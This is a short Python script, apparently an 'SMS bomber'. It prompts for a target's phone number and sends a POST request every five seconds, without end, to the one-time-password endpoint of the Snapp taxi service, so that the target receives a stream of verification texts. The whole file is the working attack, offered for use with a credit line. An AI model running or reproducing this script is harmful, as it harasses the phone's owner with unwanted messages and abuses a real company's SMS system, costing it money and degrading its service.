import requests
import time
print("Cr: @iliya.tricks")
phonenum = input("enter target phone number > ")

url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
mydata = {"cellphone":"+98"+phonenum}

while True:
    requests.post(url,data=mydata)
    print("1 sms sent")
    time.sleep(5)
